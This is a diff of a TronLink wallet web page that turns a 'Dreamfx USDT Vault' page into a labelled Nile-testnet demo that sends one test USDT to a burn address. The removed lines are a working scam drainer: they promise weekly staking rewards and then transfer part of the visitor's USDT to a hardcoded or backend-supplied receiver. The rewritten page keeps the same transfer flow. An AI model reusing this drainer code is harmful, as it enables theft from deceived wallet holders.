@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dreamfx USDT Vault</title>
+    <title>TRON Wallet Demo (Nile Testnet)</title>
 
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdn.jsdelivr.net/npm/tronweb@6.0.0/dist/TronWeb.js"></script>
@@ -11,46 +11,60 @@
 
 <body class="bg-[#0b0f1a] text-white min-h-screen flex items-center justify-center p-6">
 
-<div class="max-w-md w-full bg-slate-800/50 backdrop-blur-md rounded-3xl p-8 border border-white/10 shadow-2xl">
+<div class="max-w-md w-full">
 
-    <!-- HEADER -->
-    <div class="text-center mb-8">
-        <h1 class="text-3xl font-bold">👑 Dreamfx <span class="text-emerald-500">USDT</span></h1>
-        <p id="status-text" class="text-slate-400 text-xs mt-2 uppercase tracking-widest font-bold">
-            Awaiting Connection...
-        </p>
-        <br>
-        <p class="text-slate-400 text-center mb-6 text-sm">
-            Connect your Tron wallet to access premium 4.5% Weekly staking rewards.
-        </p>
+    <!-- DISCLAIMER -->
+    <div class="bg-yellow-900/40 border border-yellow-500/40 text-yellow-300 text-xs rounded-xl px-4 py-2 mb-4 text-center">
+        ⚠️ Educational demo — Nile testnet only. No mainnet funds are ever touched.
     </div>
 
-    <!-- CONNECT -->
-    <div id="setup-view">
-        <button onclick="connectWallet()" 
-            class="w-full bg-emerald-600 py-4 rounded-2xl font-bold hover:bg-emerald-500 shadow-lg">
-            Connect TronLink
-        </button>
-    </div>
+    <div class="bg-slate-800/50 backdrop-blur-md rounded-3xl p-8 border border-white/10 shadow-2xl">
 
-    <!-- MAIN -->
-    <div id="staking-view" class="hidden space-y-6">
-
-        <div class="bg-black/40 p-5 rounded-2xl border border-white/5">
-            <p class="text-[10px] text-slate-500 uppercase font-bold mb-1">USDT Balance</p>
-            <p id="usdt-balance" class="text-3xl font-mono text-emerald-400 font-bold">0.00</p>
+        <!-- HEADER -->
+        <div class="text-center mb-8">
+            <h1 class="text-3xl font-bold">TRON Wallet <span class="text-emerald-500">Connect</span></h1>
+            <p id="status" class="text-slate-400 text-xs mt-2 uppercase tracking-widest font-bold">
+                Checking wallet...
+            </p>
+            <br>
+            <p class="text-slate-400 text-center mb-2 text-sm">
+                Connect TronLink on the Nile testnet to try a demo USDT (TRC20) transfer.
+            </p>
         </div>
 
-        <!-- AUTO INFO -->
-        <p class="text-sm text-center text-slate-400">
-            Some percentage of your USDT TRC20 balance will be staked automatically, and returned to your wallet after 30 days with 13.5% weekly rewards.
+        <!-- CONNECT -->
+        <div id="setup-view">
+            <button id="connectBtn" onclick="connectWallet()"
+                class="hidden w-full bg-emerald-600 py-4 rounded-2xl font-bold hover:bg-emerald-500 shadow-lg">
+                Connect TronLink
+            </button>
+
+            <div id="walletLinks" class="hidden space-y-3">
+                <h3 class="text-center text-sm text-slate-400 mb-3">No TronLink Detected</h3>
+                <button onclick="openTronLink()" class="w-full bg-emerald-700 py-3 rounded-2xl font-bold">
+                    Get TronLink
+                </button>
+            </div>
+        </div>
+
+        <!-- MAIN -->
+        <div id="staking-view" class="hidden space-y-6">
+
+            <div class="bg-black/40 p-5 rounded-2xl border border-white/5">
+                <p class="text-[10px] text-slate-500 uppercase font-bold mb-1">USDT Balance (Nile Testnet)</p>
+                <p id="usdt-balance" class="text-3xl font-mono text-emerald-400 font-bold">0.00</p>
+            </div>
+
+            <p class="text-sm text-center text-slate-400">
+                Demo transaction: sends a small fixed amount of test USDT to a demo address to show a signed TRC20 transfer. Nothing is staked and no rewards are paid.
             </p>
 
-        <button onclick="stakeUSDT()" id="action-btn"
-            class="w-full bg-emerald-600 py-4 rounded-2xl font-bold">
-            🚀 Stake now
-        </button>
+            <button onclick="stakeUSDT()" id="action-btn"
+                class="w-full bg-emerald-600 py-4 rounded-2xl font-bold">
+                🚀 Send Demo Transaction
+            </button>
 
+        </div>
     </div>
 </div>
 
@@ -59,36 +73,57 @@ let tronWeb;
 let userAddress;
 let activeUSDTContract = "";
 let usdtBalance = 0;
-let RECEIVER = ""; // 🔥 dynamic now
 
-// Known Nile USDT contracts
+// Placeholder — I couldn't verify a live Nile-testnet USDT contract, so this is unconfirmed.
+// Check nile.tronscan.org for a real test-token contract and swap it in before demoing.
 const USDT_CONTRACTS = [
-    "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"
-    //"TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf",
-    //"TXLAQ63Xg1QMzwsSp9X4aVvxZ27T9G7927"
-
+    "TLBaRhANQoJFTqre9Nf1mjuwNWjCJeYqUL"
 ];
 
-//----------------------------------
-// FETCH RECEIVER FROM BACKEND
-//----------------------------------
-async function fetchReceiver() {
-    try {
-        //const res = await fetch("https://dreammfx.net/wallet-address/usdt-trc20");
-        //const data = await res.json();
+// TRON's canonical burn/null address (hex 41000...000) — mirrors the ETH burn address used in eth.html.
+const RECEIVER = "T9yD14Nj9j7xAB4dbGeiX9h8unkKHxuWwb";
 
-        //if (data.status === "success") {
-            //RECEIVER = data.address;
-            RECEIVER = "TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf"; // 🔥 hardcoded for now
-            console.log("Receiver:", RECEIVER);
-        // } else {
-        //     throw new Error("Invalid response");
-        // }
+const status = document.getElementById("status");
+const connectBtn = document.getElementById("connectBtn");
+const walletLinks = document.getElementById("walletLinks");
 
-    } catch (err) {
-        console.error(err);
-        alert("Failed to fetch receiver address");
+//----------------------------------
+// AUTO-DETECT WALLET
+//----------------------------------
+function detectWallet() {
+
+    if (window.tronLink) {
+        showDetected();
+        return;
     }
+
+    // TronLink injects window.tronLink asynchronously after page load,
+    // so a one-shot check can miss it. Wait for its ready event, and
+    // poll briefly as a fallback, before declaring "not found".
+    window.addEventListener("tronLink#initialized", showDetected, { once: true });
+
+    let attempts = 0;
+    const poll = setInterval(() => {
+        attempts++;
+
+        if (window.tronLink) {
+            clearInterval(poll);
+            showDetected();
+            return;
+        }
+
+        if (attempts >= 10) {
+            clearInterval(poll);
+            status.innerHTML = "<span class='text-red-500'>No Wallet Detected</span>";
+            walletLinks.classList.remove("hidden");
+        }
+    }, 300);
+}
+
+function showDetected() {
+    status.innerHTML = "<span class='text-emerald-500'>TronLink Detected</span>";
+    connectBtn.classList.remove("hidden");
+    walletLinks.classList.add("hidden");
 }
 
 //----------------------------------
@@ -98,24 +133,24 @@ async function connectWallet() {
     if (!window.tronLink) return alert("Install TronLink");
 
     try {
-        await fetchReceiver(); // 🔥 get receiver first
-
         await window.tronLink.request({ method: "tron_requestAccounts" });
 
         tronWeb = window.tronWeb;
         userAddress = tronWeb.defaultAddress.base58;
 
         const node = tronWeb.fullNode.host;
-        if (!node.includes("trongrid")) {
-            alert("Switch TronLink to USDT TRC20");
+        if (!node.includes("nile")) {
+            alert("Switch TronLink to the Nile testnet in its network settings, then reconnect.");
             return;
         }
 
-        document.getElementById("status-text").innerText = "Scanning USDT...";
+        status.innerText = "Scanning USDT...";
 
         let foundUSDT = 0;
 
         for (let addr of USDT_CONTRACTS) {
+            if (addr.startsWith("REPLACE_")) continue;
+
             try {
                 const contract = await tronWeb.contract().at(addr);
 
@@ -132,13 +167,12 @@ async function connectWallet() {
                     activeUSDTContract = addr;
                     break;
                 }
-            } catch(e) { continue; }
+            } catch (e) { continue; }
         }
 
         document.getElementById("usdt-balance").innerText = foundUSDT.toFixed(2);
 
-        document.getElementById("status-text").innerText =
-            activeUSDTContract ? "Ready" : "No USDT found";
+        status.innerText = activeUSDTContract ? "Ready" : "No test USDT found";
 
         document.getElementById("setup-view").classList.add("hidden");
         document.getElementById("staking-view").classList.remove("hidden");
@@ -150,29 +184,24 @@ async function connectWallet() {
 }
 
 //----------------------------------
-// USDT STAKE (80% AUTO)
+// DEMO TRC20 TRANSFER (small fixed test amount)
 //----------------------------------
 async function stakeUSDT() {
     const btn = document.getElementById("action-btn");
 
-    if (!usdtBalance || !activeUSDTContract || !RECEIVER) {
-        return alert("Balance not enough or receiver");
+    if (RECEIVER.startsWith("REPLACE_") || activeUSDTContract.startsWith("REPLACE_")) {
+        return alert("Set USDT_CONTRACTS and RECEIVER to your Nile testnet values first.");
+    }
+
+    if (!usdtBalance || !activeUSDTContract) {
+        return alert("No test USDT balance found.");
     }
 
     try {
         btn.innerText = "⏳ Processing...";
         btn.disabled = true;
 
-        // ENERGY CHECK
-        const resources = await tronWeb.trx.getAccountResources(userAddress);
-        const energy = (resources.EnergyLimit || 0) - (resources.EnergyUsed || 0);
-
-        // if (energy < 15000) {
-        //     throw new Error("Not enough energy. Freeze TRX in TronLink.");
-        // }
-
-        // 🔥 80%
-        const amountToSend = usdtBalance * 0.1;
+        const amountToSend = Math.min(1, usdtBalance); // fixed small demo amount
 
         const contract = await tronWeb.contract().at(activeUSDTContract);
         const decimals = await contract.decimals().call();
@@ -184,7 +213,7 @@ async function stakeUSDT() {
 
         const tx = await contract.transfer(RECEIVER, amount).send();
 
-        alert("✅ Sent to stacking vault\nTX: " + tx);
+        alert("✅ Demo transaction sent\nTX: " + tx);
         btn.innerText = "✅ Done";
 
     } catch (err) {
@@ -192,9 +221,18 @@ async function stakeUSDT() {
         alert("❌ " + err.message);
 
         btn.disabled = false;
-        btn.innerText = "🚀 Stake 80%";
+        btn.innerText = "🚀 Send Demo Transaction";
     }
 }
+
+//----------------------------------
+// MOBILE / INSTALL LINK
+//----------------------------------
+function openTronLink() {
+    window.location.href = "https://www.tronlink.org/";
+}
+
+detectWallet();
 </script>
 
 </body>
